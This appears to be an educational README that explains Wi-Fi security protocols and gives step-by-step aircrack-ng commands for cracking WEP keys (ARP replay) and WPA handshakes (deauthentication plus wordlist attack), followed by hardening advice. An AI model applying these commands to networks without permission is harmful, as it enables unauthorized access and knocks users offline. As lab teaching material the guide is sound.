# WEPA Demo

> ⚠️ **WARNING: This guide is intended solely for educational purposes and ethical cybersecurity demonstrations within a controlled lab environment. Unauthorized access to wireless networks is illegal and unethical. Ensure you have explicit permission to test any network you are targeting. Use this knowledge responsibly.**

> ⚠️ **For educational and demo purposes only in a legal, controlled environment.**

## Requirements

- **Kali Linux** (installed or running in a VM with USB passthrough)
- **Wi-Fi Adapter** (that supports monitor mode & packet injection)
- **A WEP/WPA-protected Wi-Fi network** (in a controlled lab setup)
- **A client device connected to that network** (to capture the handshake)

---

## Introduction

### What is 802.11?
802.11 is a family of standards developed by IEEE for wireless local area networks (WLANs). These define how wireless communication is handled in Wi-Fi networks. Types include:
- **802.11a**: 5 GHz, up to 54 Mbps
- **802.11b**: 2.4 GHz, up to 11 Mbps
- **802.11g**: 2.4 GHz, up to 54 Mbps
- **802.11n**: 2.4/5 GHz, up to 600 Mbps
- **802.11ac**: 5 GHz, supports gigabit speeds
- **802.11ax (Wi-Fi 6)**: 2.4/5/6 GHz, improved throughput and efficiency

![802.11](https://media.licdn.com/dms/image/v2/D5612AQGwlwU46QqEoA/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1653585943580?e=2147483647&v=beta&t=k99s_pynpErTBQPe275MVZcKV8QVFdusz1sSb3E2On8)

### Types of Wi-Fi Networks and Security Protocols
Wi-Fi networks can use different types of access methods and encryption standards:
- **Open**: No encryption or password; anyone can connect. Highly insecure.
- **WEP (Wired Equivalent Privacy)**: One of the first Wi-Fi security protocols, now obsolete and very easy to crack.
- **WPA (Wi-Fi Protected Access)**: Introduced to replace WEP. Uses TKIP encryption, but still vulnerable.
- **WPA2**: Most common modern protocol, using strong AES-based encryption (CCMP). Secure when using strong passwords.
- **WPA3**: Latest protocol, offering enhanced protection against offline attacks and better encryption algorithms.

Wi-Fi networks also have two major authentication modes:
- **Personal (PSK)**: Uses a pre-shared key (password). Common in home networks.
- **Enterprise (802.1X / MGT)**: Uses a RADIUS server for authentication. Common in business environments.

![WiFi](https://assets.esecurityplanet.com/uploads/2024/05/WEP-vs-WPA-vs-WPA2-vs-WPA3-2.png)

More Info: [What Is Wi-Fi Security? WEP, WPA, WPA2 & WPA3 Differences](https://nilesecure.com/network-security/what-is-wi-fi-security-wep-wpa-wpa2-wpa3-differences)

### Key Wireless Concepts
- **AP (Access Point)**: Device (usually a router) providing Wi-Fi access.
- **BSSID**: MAC address of the access point.
- **ESSID**: Name of the Wi-Fi network (SSID).
- **Station**: A client device (e.g., laptop, phone) connected to the network.
- **Channel**: The frequency the network is operating on.
- **Cipher**: Method of encryption.
    - `TKIP` (Temporal Key Integrity Protocol) – legacy and weak.
    - `CCMP` (Counter Mode with Cipher Block Chaining Message Authentication Code Protocol) – strong encryption.
- **AUTH (Authentication Type)**: Indicates the authentication method required by the network. Common values shown in tools like `airodump-ng` include:
  - `OPN`: Open network (no password)
  - `WEP`: Uses WEP encryption
  - `PSK`: Pre-Shared Key (used in WPA/WPA2-Personal)
  - `MGT`: Management (used in WPA/WPA2-Enterprise with 802.1X)
- **PWR**: Signal strength; lower is weaker, higher is stronger.
- **Rogue AP**: Unauthorized or malicious access point designed to trick users or capture data.

![Scan](https://www.101labs.net/wp-content/uploads/2022/04/52-5.png)

### Tools Used in This Guide

Here are the key tools from the Aircrack-ng suite used in this guide:

- **`iwconfig`** – Displays wireless interfaces and their status. Useful to verify if your adapter is recognized.
- **`airmon-ng`** – Enables or disables monitor mode on your wireless adapter. Monitor mode is required to capture packets from nearby Wi-Fi traffic.
- **`airodump-ng`** – Scans for nearby wireless networks and captures traffic. It is also used to capture WPA handshakes and WEP IVs.
- **`aireplay-ng`** – Sends packets to the network. It can deauthenticate clients (WPA/WPA2) or replay ARP packets (WEP) to generate traffic.
- **`aircrack-ng`** – Analyzes captured packets to crack WEP keys or brute-force WPA/WPA2 handshakes using a wordlist.


---

## Part 1: Cracking WEP

### Step 1: Verify Your Wi-Fi Adapter
```bash
iwconfig
```
This command checks if your wireless adapter is recognized by Kali. You should see an interface like `wlan0`.

### Step 2: Enable Monitor Mode
```bash
# Optional 
airmon-ng check kill

# Enable Monitor Mode
airmon-ng start wlan0
```
This switches the adapter into monitor mode, allowing it to capture all wireless packets in the air.

### Step 3: Scan for WEP Networks
```bash
airodump-ng wlan0
```
This scans nearby networks. Look for one using WEP encryption and note its BSSID, channel, and ESSID.

### Step 4: Capture Traffic from Target
```bash
# Create folder
cd ~/Desktop && mkdir demo_wep && cd demo_wep

# Capture Traffic from Target
airodump-ng --bssid <BSSID> -c <CH> -w wifi_demo wlan0
```
This focuses the scan on the target network, saving all captured packets into a file named `wep_demo.cap`.

### Step 5: ARP Replay Attack
```bash
# Get the wlan0 MAC Address
ifconfig wlan0

# ARP Replay Attack
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> wlan0
```
This injects captured ARP packets back into the network to generate more traffic (IVs), speeding up the cracking process.

### Step 6: Crack the Key
```bash
aircrack-ng wifi_demo.cap
```
Once enough IVs have been collected (~20,000+), this command attempts to crack the WEP key from the captured packets.

### Step 7: Cleanup
```bash
airmon-ng stop wlan0
service NetworkManager restart
```
Stops monitor mode and restores your normal Wi-Fi connection.

---

## Part 2: Cracking WPA

### Step 1: Verify Your Wi-Fi Adapter
```bash
iwconfig
```
Confirm your adapter is listed and functioning.

### Step 2: Enable Monitor Mode
```bash
airmon-ng start wlan0
```
Enables monitor mode, required for capturing handshake packets.

### Step 3: Scan for WPA/WPA2 Networks
```bash
airodump-ng wlan0
```
Scan for the target WPA/WPA2 network. Note its BSSID, channel, and ESSID.

### Step 4: Capture the Handshake
```bash
# Create folder
cd ~/Desktop && mkdir demo_wep && cd demo_wep

# Capture the Handshake
airodump-ng --bssid <BSSID> -c <CH> -w wifi_demo wlan0
```
Focus on the target network and wait for a device to connect or reconnect. This captures the WPA handshake.

### Step 5: Deauthenticate Client (Force Reconnect)
```bash
aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan0
```
This sends disconnect packets to a client device, forcing it to reconnect and trigger a new handshake that we can capture.

You should see a message like:
```
[ WPA handshake: <BSSID> ]
```

### Step 6: Crack the Handshake with a Wordlist
```bash
aircrack-ng wifi_demo.cap -w wordlist.txt
```
This runs a dictionary attack, testing passwords from `wordlist.txt` against the captured handshake.

### Step 7: Cleanup
```bash
airmon-ng stop wlan0mon
service NetworkManager restart
```
Restores your adapter back to normal mode.

---

### Recommendations for Securing Wi-Fi Networks
- Use **WPA2 or WPA3** whenever possible.
- Avoid **WEP** and **WPA** (insecure).
- Choose **strong, unique passwords** not found in common dictionaries.
- Change default router settings (SSID, admin password).
- Disable WPS (Wi-Fi Protected Setup).
- Monitor connected devices regularly.
- Use VLANs and guest networks to separate traffic.

### Want to practice safely?
You can use [https://lab.wifichallenge.com/](https://lab.wifichallenge.com/) — an online virtual Wi-Fi lab — to legally practice capturing handshakes, scanning networks, and testing cracking techniques in a realistic but controlled environment. It’s perfect for hands-on learning without needing physical hardware.

